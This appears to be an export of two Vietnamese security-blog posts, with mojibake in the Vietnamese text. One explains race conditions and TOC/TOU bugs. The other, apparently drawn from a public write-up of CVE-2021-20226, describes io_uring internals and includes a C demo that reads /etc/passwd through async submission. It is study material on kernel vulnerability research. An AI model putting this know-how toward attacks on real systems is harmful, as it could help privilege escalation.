Ä‘á»‘i vá»›i victim (hoáº·c mong muá»‘n - Ä‘á»‘i vá»›i attacker). Race conditons khÃ´ng pháº£i luÃ´n lÃ  lá»— há»•ng báº£o máº­t vÃ¬ má»™t sá»‘ trÆ°á»ng há»£p, nhá»¯ng hÃ nh vi khÃ´ng mong muá»‘n Ä‘Æ°á»£c phÃ¡t sinh nÃ y khÃ´ng mang láº¡i nguy hiá»ƒm nÃ o Ä‘á»‘i vá»›i há»‡ thá»‘ng cáº£. Race conditons cÃ³ thá»ƒ xuáº¥t hiá»‡n á»Ÿ nhiá»u ngá»¯ cáº£nh, tháº­m chÃ­ tá»“n táº¡i ngay trong nhá»¯ng thiáº¿t bá»‹ Ä‘iá»‡n tá»­ cÆ¡ báº£n (cáº£ Ä‘iá»‡n sinh há»c. Race condtions Ä‘Ã£ tÃ¬m tháº¥y bÃªn trong nÃ£o cá»§a chuá»™t sá»‘ng). Tiá»n Ä‘á» cÆ¡ báº£n cho race conditions lÃ  2 thread chá»‘ng láº¡i nhau Ä‘á»ƒ tÃ¬m ngÆ°á»i tháº¯ng cuá»™c. NgÆ°á»i tháº¯ng cÃ³ quyá»n thao tÃºng luá»“ng thá»±c thi cá»§a á»©ng dá»¥ng. 1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;signal.h\u0026gt; // keep an eye out for this header especially #include \u0026lt;race_conditon.h\u0026gt; int main(void){ if (something == permitted){ doThis(); } else { printf(\u0026#34;lolnope\\n\u0026#34;); } } ThÃ´ng thÆ°á»ng, race conditons cÃ³ xu hÆ°á»›ng xuáº¥t hiá»‡n trong nhá»¯ng á»©ng dá»¥ng viáº¿t báº±ng C. Äáº·c biá»‡t trong nhá»¯ng chÆ°Æ¡ng trÃ¬nh cÃ³ sá»­ dá»¥ng thÆ° viá»‡n signal.h vÃ¬ header nÃ y xuáº¥t hiá»‡n dá»± bÃ¡o ráº±ng chÆ°Æ¡ng trÃ¬nh sáº½ cÃ³ nhá»¯ng race tÃ¬m áº©n Ä‘á»ƒ dáº«n tá»›i sá»‘ lÆ°á»£ng tÃ­n hiá»‡u xá»­ lÃ­ lÃ  Ã­t nháº¥t. Máº·t khÃ¡c, náº¿u kiá»ƒm tra quyá»n cá»§a cÃ¡c tá»‡p cÃ³ xuáº¥t hiá»‡n cÃ¡c symlink races cÅ©ng cho tháº¥y cÃ³ nguy cÆ¡ vá» race condition. Äoáº¡n code trÃªn chá»‰ lÃ  mÃ£ giáº£, nÃ³ sáº½ khÃ´ng cháº¡y, má»¥c Ä‘Ã­ch cá»§a Ä‘oáº¡n mÃ£ giáº£ nháº±m giÃºp chÃºng ta cÃ³ cÃ¡i nhÃ¬n trá»±c quan hÆ¡n vá» kiá»ƒu táº¥n cÃ´ng dá»±a trÃªn race condition. Gá»‰a sá»­ attacker gá»­i hai operations tá»›i chÆ°Æ¡ng trÃ¬nh táº¡i cÃ¹ng thá»i Ä‘iá»ƒm, cÃ¹ng 1 tráº¡ng thÃ¡i trÃªn luá»“ng mÃ£ thá»±c thi (náº¿u Ä‘Æ°á»£c). Náº¿u nhÆ° thá»i gian chÃ­nh xÃ¡c, attacker cÃ³ thá»ƒ cho phÃ©p má»™t biáº¿n nÃ o Ä‘Ã³ Ä‘Ãºng / hoáº·c sai táº¡i má»™t thá»i Ä‘iá»ƒm kiá»ƒm tra, nhÆ°ng biáº¿n nÃ y khÃ´ng cÃ²n Ä‘Æ°á»£c sá»­ dá»¥ng táº¡i thá»i Ä‘iá»ƒm Ä‘Ã³. (NÃ y Ä‘Æ°á»£c gá»i lÃ  TOC/TOU race cÃ³ nghÄ©a lÃ  Time of Check, Time of Use)\nGiáº£ sá»­, chÃºng ta thá»±c hiá»‡n lá»‡nh 1 if (something_is_permitted) // check if permitted Náº¿u Ä‘iá»u kiá»‡n Ä‘Ãºng thÃ¬ nÃ³ sáº½ thá»±c thi doThis() giá»‘ng nhÆ° kÃ¬ vá»ng cá»§a tÃ¡c giáº£, tuy nhiÃªn náº¿u somethig_is_not_permitted mÃ  hÃ m if nÃ y váº«n cháº¥p nháº­n thÃ¬ khi thá»±c hiá»‡n doThis() sáº½ cÃ³ nguy cÆ¡ phÃ¡t sinh nhá»¯ng trÆ°á»ng há»£p khÃ´ng mong muá»‘n, vÃ  tuy theo mÃ£ sau Ä‘Ã³ tháº¿ nÃ o mÃ  attacker cÃ³ thá»ƒ bypass access controls, escalate privileges, cause a denial of service\nKhi nÃ³i vá» Race Conditions, má»i ngÆ°á»i thÆ°á»ng nghÄ© tá»›i nhá»¯ng thá»© gÃ¬ Ä‘Ã³ ráº¥t nhanh, thá»i gian pháº£i cá»±c kÃ¬ chÃ­nh xÃ¡c Ä‘á»ƒ cÃ³ thá»ƒ thá»±c thi TOC/TOU race. Äiá»u nÃ y khÃ´ng sai, tuy nhiÃªn khÃ´ng pháº£i lÃºc nÃ o cÅ©ng váº­y. CÃ¹ng xem xÃ©t vÃ­ dá»¥ vá» lá»—i `slow-paced\u0026quot; race condition: CÃ³ má»™t á»©ng dá»¥ng máº¡ng xÃ£ há»™i, ngÆ°á»i dá»«ng cÃ³ thá»ƒ sá»­ Ä‘á»•i thÃ´ng tin cá»§a há». Má»™t user click vÃ o nÃºt \u0026ldquo;edit profile\u0026rdquo;, á»©ng dá»¥ng má»Ÿ ra má»™t trang web cho phÃ©p há» thá»±c hiá»‡n sá»­a Ä‘á»•i. User tiáº¿n hÃ nh sá»­ Ä‘á»•i báº±ng bÃ n phÃ­m (go AFK - Away from Keyboard). Quáº£n trá»‹ viÃªn nhÃ¬n tháº¥y nhá»¯ng lá»—i khÃ´ng mong muá»‘n trong chá»©c nÄƒng sá»­a Ä‘á»•i thÃ´ng tin trÃªn website, nÃªn quyáº¿t Ä‘á»‹nh táº¯t chá»©c nÄƒng nÃ y. Do Ä‘Ã³, user khÃ´ng thá»ƒ dÃ¹ng nÃ³ Ä‘á»ƒ sá»­a thÃ´ng tin cá»§a há». Quay láº¡i vá»›i user trÃªn, anh ta váº«n cÃ²n Ä‘ang á»Ÿ trong trang web cho viá»‡c sá»­a Ä‘á»•i thÃ´ng tin. Máº·c dÃ¹ new user khÃ´ng thá»ƒ truy cáº­p vÃ o trang \u0026ldquo;edit profile\u0026rdquo;, nhÆ°ng user nÃ y váº«n cÃ²n trang web cho viá»‡c sá»­a Ä‘á»•i thÃ´ng tin nÃªn anh ta váº«n cÃ³ thá»ƒ tiáº¿p tá»¥c sá»­a Ä‘á»•i, máº·c dÃ¹ chá»©c nÄƒng nÃ y Ä‘Ã£ bá»‹ quáº£n trá»‹ viÃªn táº¯t. Race conditons cÃ³ thá»ƒ Ä‘Æ°á»£c gÃ¢y ra do Ä‘á»™ trá»… trong networks. Giáº£ sá»­ cÃ³ má»™t hub vÃ  2 linked nodes. Bob muá»‘n Ä‘Äƒng kÃ­ má»™t channel #hax vÃ  Alice cÅ©ng muosn Ä‘Äƒng kÃ­ cÃ¹ng chanel nÃ y. Xem xÃ©t trÆ°á»ng há»£p sau: Bob káº¿t ná»‘i tá»›i IRC tá»« node #1 Alice káº¿t ná»‘i tá»›i IRC tá»« node #2 Bob cháº¡y /join #hax Alice cháº¡y /join #hax Cáº£ hai cÃ¢u lá»‡nh Ä‘á»u Ä‘Æ°á»£c thá»±c hiá»‡n tá»«u 2 node khÃ¡c nhau, cÃ¹ng 1 thá»i Ä‘iá»ƒm. Bob trá»Ÿ thÃ nh ngÆ°á»i Ä‘iá»u hÃ nh cá»§a #hax. Alic trá»Ÿ thÃ nh ngÆ°á»i Ä‘iá»u hÃ nh cá»§a #hax. NguyÃªn nhÃ¢n cho trÆ°á»ng há»£p nÃ y bá»Ÿi vÃ¬ Ä‘á»™ trá»… máº¡ng, node #1 sáº½ cÃ³ thá»i gian gá»­i tÃ­n hiá»‡u tá»›i node #2 Ä‘á»ƒ cáº£nh bÃ¡o ráº±ng Services Daemon Ä‘Ã£ bá»‹ ngÆ°á»i khÃ¡c náº¯m giá»¯ trÃªn cÃ¹ng network. (PROTIP: When testing local desktop applications for Race Conditions - for example a compiled binary - use something like GDB or OllyDBG to set a breakpoint between TOC and TOU within the source code of the binary you are debugging. Execute your code from the breakpoint and take note of the results in order to determine any potential security risk or lack thereof. This is for confirmation of the bug only, and not for actual exploitation. As the saying goes, PoC||GTFO. This rings especially true with race conditions considering some of them are just bugs or glitches or whatever you wanna call them, as opposed to viable exploits with real attack value. If you cannot demonstrate impact, you probably should not report it)\r","description":"Trong quÃ¡ trÃ¬nh reproduce CVE-2019-18683, tÃ´i nháº­n ra hiá»ƒu biáº¿t cá»§a mÃ¬nh vá» race condtion quÃ¡ Ã­t vÃ  háº¡n háº¹p, bÃ i viáº¿t nÃ y vá»›i má»¥c Ä‘Ã­ch note láº¡i nhá»¯ng kiáº¿n thá»©c liÃªn quan vá» race condtion","id":15,"section":"posts","tags":["cve, linux kernel, race condition"],"title":"Wining the racing","uri":"https://minhlongmt183.github.io/posts/wining_the_racing/"},{"content":"\rBÃ i viáº¿t nÃ y nháº±m má»¥c Ä‘Ã­ch ghi láº¡i nhá»¯ng kiáº¿n thá»©c Ä‘Ã£ há»c Ä‘á»ƒ nhá»› vÃ  hiá»ƒu rÃµ hÆ¡n. BÃ i viáº¿t tham kháº£o chá»§ yáº¿u tá»« CVE-2021â€“20226 a reference counting bug which leads to local privilege escalation in io_uring.\rÄÃ´i nÃ©t vá» io_uring io_uring Asynchronous I/O (AIO) framework lÃ  má»™t giao diá»‡n I/O má»›i cho Linux, Ä‘Æ°á»£c giá»›i thiá»‡u trÃªn linux kernel version 5.1 (thÃ¡ng 3 - 2019).\nCommunication channel From: https://flattsecurity.medium.com/cve-2021-20226-a-reference-counting-bug-which-leads-to-local-privilege-escalation-in-io-uring-e946bd69177a\nio_uring instance cÃ³ 2 vÃ²ng, submission queue (SQ) vÃ  completion queue (CQ) Ä‘Æ°á»£c chia sáº» giá»¯a kernel vÃ  á»©ng dá»¥ng. Nhá»¯ng hÃ ng Ä‘á»£i: single producer, single consumer cung cáº¥p 1 giao diá»‡n Ã­t khÃ³a, vÃ  Ä‘Æ°á»£c phá»‘i há»£p vá»›i rÃ o cáº£n bá»™ nhá»› (memory barrier). Application sáº½ táº¡o má»™t hoáº·c nhiá»u SQ entry (SQE) vÃ  sáº½ cáº­p nháº­t vÃ o Ä‘uÃ´i cá»§a hÃ ng Ä‘á»£i SQ. Kernel cÅ©ng sá»­ dá»¥ng SQE, nÃ³ sáº½ cáº­p nháº­t vÃ o Ä‘áº§u cá»§a hÃ ng Ä‘á»£i SQ. Kernel sáº½ táº¡o má»™t hoáº·c nhiá»u CQ entry (CQE) vÃ  sáº½ cáº­p nháº­t vÃ o Ä‘uÃ´i cá»§a hÃ ng Ä‘á»£i CQ. Application cÅ©ng sá»­ dá»¥ng tháº±ng CQE nÃ y vÃ  cáº­p nháº­t tá»« Ä‘áº§u cá»§a hÃ ng Ä‘á»£i CQ. Systemcall API io_uring API gá»“m 3 system call chÃ­nh bao gá»“m: io_uring_setup, io_uring_register, io_uring_enter\nio_uring_setup Thiáº¿t láº­p má»™t ngá»¯ cáº£nh Ä‘á»ƒ thá»±c hiá»‡n cháº¡y IO báº¥t Ä‘á»“ng bá»™.\n1 int io_uring_setup(u32 entries, struct io_uring_params *p); Lá»‡nh nÃ y sáº½ tiáº¿n hÃ nh thiáº¿t láº­p 2 hÃ ng Ä‘á»£i submission queue vÃ  completion queue vá»›i sá»‘ lÆ°á»£ng cÃ¡c pháº§n tá»­ entries Ã­t nháº¥t. Tráº£ vá» má»™t file description Ä‘á»ƒ thá»±c hiá»‡n cÃ¡c hoáº¡t Ä‘á»™ng tiáº¿p theo trÃªn phiÃªn báº£n io_uring. 2 hÃ ng Ä‘á»£i nÃ y Ä‘Æ°á»£c chia sáº» giá»¯a kernel vÃ  application, giÃºp giáº£m chi phÃ­ khi dá»¯ liá»‡u giao tiáº¿p giá»¯a 2 bÃªn (ko cáº§n pháº£i sao chÃ©p) khi khá»Ÿi táº¡o vÃ  thá»±c thi I/O.\nNhá»¯ng tham sá»‘ Ä‘Æ°á»£c sá»­ dá»¥ng bá»Ÿi application Ä‘á»ƒ cáº¥u hÃ¬nh cho io_uring instance vÃ  kernel sáº½ tráº£ láº¡i thÃ´ng tin vá» cáº¥u hÃ¬nh Ä‘áº¿n 2 hÃ ng vÃ²ng buffer.\nio_uring instance cÃ³ thá»ƒ Ä‘Æ°á»£c cáº¥u hÃ¬nh á»Ÿ 3 cháº¿ Ä‘á»™ hoáº¡t Ä‘á»™ng chÃ­nh:\nInterrupt driven Máº·c Ä‘á»‹nh, io_uring instance sáº½ Ä‘Æ°á»£c thiáº¿t láº­p Ä‘á»ƒ Ä‘iá»u khiá»ƒn IO khi lá»—i, IO cÃ³ thá»ƒ Ä‘Æ°á»£c gá»­i báº±ng io_uring_enter() vÃ  Ä‘Æ°á»£c láº¥y trá»±c tiáº¿p tá»« completion queue. Polled: thá»±c hiá»‡n cháº¿ Ä‘á»™ chá» I/O hoÃ n thÃ nh. File há»‡ thá»‘ng vÃ  nhá»¯ng thiáº¿t bá»‹ khá»‘i (block device) cáº§n pháº£i Ä‘Æ°á»£c há»— trá»£ má»›i sá»­ dá»¥ng tÃ­nh nÄƒng nÃ y. TÃ­nh nÄƒng nÃ y giÃºp giáº£m thiá»ƒu Ä‘á»™ trá»… khi thá»±c hiá»‡n IO, tuy nhiÃªn nÃ³ láº¡i tá»‘n nhiá»u resource cá»§a CPU hÆ¡n viá»‡c thá»±c hiá»‡n Interrupt. Hiá»‡n nay, tÃ­nh nÄƒng nÃ y chá»‰ thá»±c hiá»‡n vá»›i nhá»¯ng file descriptor Ä‘Æ°á»£c má»Ÿ kÃ¨m vá»›i cá» O_DIRECT.\nKhi Ä‘á»c hoáº·c viáº¿t vÃ o ngá»¯ cáº£nh Ä‘Ã£ thiáº¿t láº­p poll thÃ¬ á»©ng dá»¥ng pháº£i tiáº¿n hÃ nh xem tÃ¬nh tráº¡ng hoÃ n thÃ nh trÃªn CQ ring báº±ng lá»‡nh io_uring_enter(). Viá»‡c trá»™n vÃ  káº¿t há»£p I / O Ä‘Ã£ Ä‘Æ°á»£c thÄƒm dÃ² vÃ  khÃ´ng Ä‘Æ°á»£c thÄƒm dÃ² trÃªn má»™t phiÃªn báº£n io_uring lÃ  ko Ä‘Æ°á»£c phÃ©p. Kernel polled: Trong cháº¿ Ä‘á»™ nÃ y, kernel thread Ä‘Æ°á»£c táº¡o Ä‘á»ƒ thÄƒm dÃ² hÃ ng Ä‘á»£i gá»­i (submission queue). Má»™t io_uring instanceÄ‘Æ°á»£c cáº¥u hÃ¬nh theo cÃ¡ch nÃ y cho phÃ©p á»©ng dá»¥ng xá»­ lÃ­ I/O mÃ  khÃ´ng cáº§n xuá»‘ng kernel. Báº±ng viá»‡c dÃ¹ng submisstion queue Ä‘á»ƒ Ä‘iá»n nhá»¯ng SQE má»›i vÃ  kiá»ƒm tra tÃ¬nh tráº¡ng hoÃ n thÃ nh trÃªn completion queue, á»©ng dá»¥ng cÃ³ thá»ƒ submit vÃ  láº¥y káº¿t quáº£ I/O mÃ  khÃ´ng cáº§n thá»±c hiá»‡n system call.\nTrÆ°á»ng há»£p kernel ráº£nh rá»—i hÆ¡n tá»•ng thá»i gian ngÆ°á»i dÃ¹ng cáº¥u hÃ¬nh, nÃ³ sáº½ tiáº¿p tá»¥c nhÃ n rá»—i Ä‘áº¿n khi nháº­n Ä‘Æ°á»£c thÃ´ng bÃ¡o tá»« á»©ng dá»¥ng. Trong trÆ°á»ng há»£p nÃ y, á»©ng dá»¥ng gá»i lá»‡nh io_uring_enter() Ä‘á»ƒ tiáº¿n hÃ nh Ä‘Ã¡nh thá»©c kernel.\nio_uring_setup() sáº½ tráº£ vá» má»™t fd (file descripton), giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c sá»­ dá»¥ng cho mmap Ä‘á»ƒ táº¡o 2 hÃ ng Ä‘á»£i SQ vÃ  CQ, vÃ  cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng bá»Ÿi 2 system call io_uring_register() vÃ  io_uring_enter() io_uring_register Nhá»¯ng file Ä‘Æ°á»£c Ä‘Äƒng kÃ­ hoáº·c user buffer cháº¡y IO báº¥t Ä‘á»“ng bá»™.\n1 int io_uring_register(unsigned int fd, unsigned int opcode, void *arg, unsigned int nr_args); ÄÆ°á»£c sá»­ dá»¥ng cho thá»±c thá»ƒ io_uring Ä‘Æ°á»£c trá» bá»Ÿi fd. Viá»‡c Ä‘Äƒng kÃ­ nÃ y giÃºp kernel thread\ncÃ³ thá»i gian tham chiáº¿u tá»›i cáº¥u trÃºc dá»¯ liá»‡u bÃªn trong kernel liÃªn káº¿t vá»›i tá»‡p lÃ¢u hÆ¡n, hoáº·c táº¡o Ã¡nh xáº¡ cá»§a tá»«ng vÃ¹ng nhá»› cá»¥ thá»ƒ trÃªn á»©ng dá»¥ng vá»›i buffer lÃ¢u hÆ¡n. ChÃºng ta chá»‰ cáº§n Ä‘Äƒng kÃ­ 1 láº§n thay vÃ¬ pháº£i thá»±c hiá»‡n nhiá»u láº§n trong quÃ¡ trÃ¬nh xá»­ lÃ­, viá»‡c nÃ y giÃºp giáº£m overhead trÃªn IO trong xá»­ lÃ­. Nhá»¯ng buffer Ä‘Æ°á»£c Ä‘Äƒng kÃ­ sáº½ bá»‹ khÃ³a trÃªn memory vÃ  sáº½ bá»‹ \u0026ldquo;tÃ­nh phÃ­\u0026rdquo; theo giá»›i háº¡n RLIMIT_MEMLOCK cá»§a ngÆ°á»i dÃ¹ng. ThÆ°á»ng giá»›i háº¡n nÃ y sáº½ lÃ  1GB/buffer. Hiá»‡n táº¡i, bá»™ nhá»› Ä‘á»‡m pháº£i áº©n danh (ANONYMOUS) vÃ  khÃ´ng Ä‘Æ°á»£c sao lÆ°u báº±ng tá»‡p. CÃ³ thá»ƒ thiáº¿t láº­p 1 vÃ¹ng Ä‘á»‡m lá»›n rá»“i chá»n 1 pháº§n nhá» cho I/O, miá»…n pháº§n nhá» Ä‘Ã³ náº±m trong vÃ¹ng Ä‘Æ°á»£c Ã¡nh xáº¡. á»¨ng dá»¥ng cÃ³ thá»ƒ tÄƒng, giáº£m kÃ­ch thÆ°á»›c hoáº·c sá»‘ lÆ°á»£ng buffer Ä‘Ã£ Ä‘Äƒng kÃ­ báº±ng cÃ¡ch há»§y Ä‘Äƒng kÃ­ buffer hiá»‡n táº¡i vÃ  Ä‘Äƒng kÃ­ buffer má»›i vá»›i lá»‡nh io_uring_register(). Má»™t á»©ng dá»¥ng cÃ³ thá»ƒ cáº­p nháº­t Ä‘á»™ng táº­p cÃ¡c file Ä‘Ã£ Ä‘Äƒng kÃ­ mÃ  khÃ´ng cáº§n há»§y Ä‘Äƒng kÃ­ chÃºng. CÃ³ thá»ƒ sá»­ dá»¥ng eventfd Ä‘á»ƒ nháº­n thÃ´ng bÃ¡o vá» cÃ¡c sá»± kiá»‡n hoÃ n thÃ nh trÃªn phiÃªn báº£n io_uring. Náº¿u Ä‘áº¡t Ä‘Æ°á»£c, má»™t eventfd file descriptor cÃ³ thá»ƒ Ä‘Æ°á»£c Ä‘Äƒng kÃ­ thÃ´ng qua system call nÃ y. ThÃ´ng tin Ä‘Äƒng nháº­p cá»§a á»©ng dá»¥ng Ä‘ang cháº¡y cÃ³ thá»ƒ Ä‘Æ°á»£c Ä‘Äƒng kÃ­ vá»›i io_uring, nÃ³ sáº½ tráº£ vá» má»™t id liÃªn káº¿t vá»›i cÃ¡c thÃ´ng tin Ä‘Ã£ Ä‘Äƒng nháº­p Ä‘Ã³. CÃ¡c á»©ng dá»¥ng muá»‘n chia sáº» vÃ²ng káº¿t ná»‘i giá»¯a nhá»¯ng ngÆ°á»i dÃ¹ng / quy trÃ¬nh riÃªng biá»‡t cÃ³ thá»ƒ chuyá»ƒn vÃ o id thÃ´ng tin xÃ¡c thá»±c nÃ y trong trÆ°á»ng tÃ­nh cÃ¡ch SQE. Náº¿u Ä‘Æ°á»£c Ä‘áº·t, SQE cá»¥ thá»ƒ Ä‘Ã³ sáº½ Ä‘Æ°á»£c cáº¥p vá»›i cÃ¡c thÃ´ng tin xÃ¡c thá»±c nÃ y. io_uring_enter Khá»Ÿi táº¡o vÃ  hoÃ n thÃ nh I/O báº¥t Ä‘á»“ng bá»™\nio_uring_enter() dÃ¹ng Ä‘á»ƒ khá»Ÿi táº¡o vÃ  hoÃ n thÃ nh I/O\tsá»­ dá»¥ng hÃ ng Ä‘á»£i submission vÃ  completion Ä‘Æ°á»£c thiáº¿t láº­p bá»Ÿi io_uring_setup(). Má»™t lá»‡nh gá»i Ä‘Æ¡n sáº½ bao gá»“m gá»­i má»™t I/O má»›i vÃ  Ä‘á»£i pháº£n há»“i cá»§a lá»‡nh gá»i nÃ y hoáº·c táº¥t cáº£ cÃ¡c lá»‡nh gá»i trÆ°á»›c Ä‘Ã³ Ä‘áº¿n io_uring_enter(). 1 2 int io_uring_enter(unsigned int fd, unsigned int to_submit, unsigned int min_complete, unsigned int flags, sigset_t *sig); Trong Ä‘Ã³:\nfd file descriptor Ä‘Æ°á»£c return bá»Ÿi io_uring_setup() to_submit chá»‰ Ä‘á»‹nh sá»‘ lÆ°á»£ng I/O Ä‘á»ƒ submit tá»« submission queue. Náº¿u Ä‘Æ°á»£c chá»‰ dáº«n nhÆ°u váº­y, há»‡ thá»‘ng sáº½ Ä‘á»£i hoÃ n thÃ nh sá»± kiá»‡n min_complete trÆ°á»›c khi quay trá»Ÿ láº¡i. Náº¿u thá»±c thá»ƒ io_uring Ä‘Æ°á»£c cáº¥u hÃ¬nh Ä‘á»ƒ thÄƒm dÃ², thÃ¬ min_complete sáº½ cÃ³ Ã½ nghÄ©a khÃ¡c má»™t chÃºt. min_complete: nhÆ° á»Ÿ trÃªn Ä‘Ã£ nÃ³i, ngoÃ i ra, náº¿u nÃ³ báº±ng 0 Ã½ nÃ³i kernel sáº½ tráº£ vá» báº¥t kÃ¬ sá»± kiá»‡n nÃ o Ä‘Ã£ Ä‘Æ°á»£c hoÃ n thÃ nh mÃ  khÃ´ng bá»‹ cháº·n. Náº¿u khÃ¡c 0, kernel chá»‰ tráº£ vá» láº­p tá»©c sá»± kiá»‡n Ä‘ang hoÃ n thÃ nh. Náº¿u khÃ´ng cÃ³ sá»± kiá»‡n hoÃ n thÃ nh nÃ o kháº£ dá»¥ng, thÃ¬ cuá»™c gá»i sáº½ thÄƒm dÃ² Ã½ kiáº¿n â€‹â€‹cho Ä‘áº¿n khi cÃ³ má»™t hoáº·c nhiá»u sá»± kiá»‡n hoÃ n thÃ nh hoáº·c cho Ä‘áº¿n khi quÃ¡ trÃ¬nh vÆ°á»£t quÃ¡ pháº§n thá»i gian cá»§a bá»™ láº­p lá»‹ch cá»§a nÃ³. LÆ°u Ã½ ráº±ng Ä‘á»‘i vá»›i I / O Ä‘Æ°á»£c Ä‘iá»u khiá»ƒn giÃ¡n Ä‘oáº¡n, má»™t á»©ng dá»¥ng cÃ³ thá»ƒ kiá»ƒm tra hÃ ng Ä‘á»£i hoÃ n thÃ nh Ä‘á»ƒ biáº¿t sá»± kiá»‡n hoÃ n thÃ nh mÃ  khÃ´ng cáº§n nháº­p háº¡t nhÃ¢n. io_uring_enter() há»— trá»£ nhiá»u phÃ©p toÃ¡n, bao gá»“m: Open, close, and stat files Read and write into multiple buffers or pre-mapped buffers Socket I/O operations Synchronize file state GiÃ¡m sÃ¡t báº¥t Ä‘á»“ng bá»™ má»™t táº­p file descriptors Táº¡o timeout liÃªn káº¿t tá»›i hoáº¡t Ä‘á»™ng cá»¥ thá»ƒ trong vÃ²ng Cá»‘ gáº¯ng há»§y má»™t hoáº¡t Ä‘á»™ng hiá»‡n Ä‘ang bay (thá»±c hiá»‡n) Táº¡o I/O chains Thá»±c hiá»‡n theo thá»© tá»± trong má»™t chuá»—i Thá»±c thi song song cho nhiá»u chuá»—i CÆ¡ cháº¿ hoáº¡t Ä‘á»™ng Asynchronous execution KhÃ´ng pháº£i lÃºc nÃ o io_uring cÅ©ng cháº¡y báº¥t Ä‘á»“ng bá»™ mÃ  nÃ³ chá»‰ cháº¡y khi nÃ³ cáº§n. NguyÃªn nhÃ¢n lÃ  Ä‘á»ƒ giáº£m thiá»ƒu tá»‘i Ä‘a viá»‡c gá»i io_uring_enter() system call Ä‘á»ƒ tÄƒng hiá»‡u suáº¥t cá»§a chÆ°Æ¡ng trÃ¬nh.\nVÃ­ dá»¥ á»Ÿ Ä‘oáº¡n code dÆ°á»›i Ä‘Ã¢y (Kernel 5.8)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 #define _GNU_SOURCE #include \u0026lt;sched.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/fcntl.h\u0026gt; #include \u0026lt;err.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #define SYSCHK(x) ({ \\ typeof(x) __res = (x); \\ if (__res == (typeof(x))-1) \\ err(1, \u0026#34;SYSCHK(\u0026#34; #x \u0026#34;)\u0026#34;); \\ __res; \\ }) static int uring_fd; struct iovec *io; #define SIZE 32 char _buf[SIZE]; int main(void) { // initialize uring struct io_uring_params params = { }; uring_fd = SYSCHK(syscall(__NR_io_uring_setup, /*entries=*/10, \u0026amp;params)); unsigned char *sq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING)); unsigned char *cq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING)); struct io_uring_sqe *sqes = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES)); io = malloc(sizeof(struct iovec)*1); io[0].iov_base = _buf; io[0].iov_len = SIZE; struct timespec ts = { .tv_sec = 1 }; sqes[0] = (struct io_uring_sqe) { .opcode = IORING_OP_TIMEOUT, //.flags = IOSQE_IO_HARDLINK, .len = 1, .addr = (unsigned long)\u0026amp;ts }; sqes[1] = (struct io_uring_sqe) { .opcode = IORING_OP_READV, .addr = io, .flags = 0, .len = 1, .off = 0, .fd = SYSCHK(open(\u0026#34;/etc/passwd\u0026#34;, O_RDONLY)) }; ((int*)(sq_ring + params.sq_off.array))[0] = 0; ((int*)(sq_ring + params.sq_off.array))[1] = 1; (*(int*)(sq_ring + params.sq_off.tail)) += 2; int submitted = SYSCHK(syscall(__NR_io_uring_enter, uring_fd, /*to_submit=*/2, /*min_complete=*/0, /*flags=*/0, /*sig=*/NULL, /*sigsz=*/0)); while(1){ usleep(100000); if(*_buf){ puts(\u0026#34;READV executed.\u0026#34;); break; } puts(\u0026#34;Waiting.\u0026#34;); } } CÃ¹ng nhÃ¬n láº¡i cÆ¡ cháº¿ lÃ m viá»‡c cá»§a io_uring\nFrom: https://flattsecurity.medium.com/cve-2021-20226-a-reference-counting-bug-which-leads-to-local-privilege-escalation-in-io-uring-e946bd69177a\nChÃºng ta cÃ³ má»™t cáº¥u trÃºc iovec á»Ÿ line 21 Ä‘á»ƒ Ä‘á»‹nh nghÄ©a má»™t pháº§n tá»­ vector 1 2 3 4 struct iovec{ ptr_t iov_base; /* Starting address */ size_t iov_len; /* Length in bytes */ }; ThÃ´ng thÆ°á»ng cáº¥u trÃºc nÃ y Ä‘Æ°á»£c sá»­ dá»¥ng nhÆ° má»™t máº£ng gá»“m nhiá»u pháº§n tá»­. Má»—i láº§n chuyá»ƒn Ä‘á»•i dá»¯ liá»‡u, con trá» iov_base sáº½ trá» vÃ o vÃ¹ng Ä‘á»‡m Ä‘á»ƒ nháº­n dá»¯ liá»‡u (vá»›i lá»‡nh readv) hoáº·c chuyá»ƒn dá»¯ liá»‡u (vá»›i lá»‡nh writev). CÃ²n pháº§n tá»­ iov_len Ä‘á»‹nh nghÄ©a Ä‘á»™ dÃ i tá»‘i Ä‘a Ä‘Æ°á»£c nháº­n vÃ  Ä‘Æ°á»£c viáº¿t trong má»—i láº§n thá»±c thi. Äoáº¡n code tá»« line 40-42 Ä‘á»ƒ cáº¥p phÃ¡t cÅ©ng nhÆ° Ä‘á»‹nh nghÄ©a giÃ¡ trá»‹ cÃ¡c pháº§n tá»­ iov_base vÃ  iov_len.\nCáº¥u trÃºc io_uring_params á»Ÿ line 29 dÃ¹ng Ä‘á»ƒ chuyá»ƒn cÃ¡c tÃ¹y chá»n Ä‘áº¿n kernel vÃ  tá»« kernel truyá»n thÃ´ng tin vá» bá»™ Ä‘á»‡m vÃ²ng (ring buffer) 1 2 3 4 5 6 7 8 9 10 11 struct io_uring_params { __u32 sq_entries; __u32 cq_entries; __u32 flags; __u32 sq_thread_cpu; __u32 sq_thread_idle; __u32 features; __u32 resv[4]; struct io_sqring_offsets sq_off; struct io_cqring_offsets cq_off; }; Code tá»« line 29-39 dÃ¹ng Ä‘á»ƒ táº¡o 2 vÃ²ng Ä‘Ãªm buffer cho SQ vÃ  CQ cÃ¹ng vá»›i 1 buffer SQEs Ä‘á»ƒ lÆ°u cÃ¡c Submission Entries. Cáº¥u 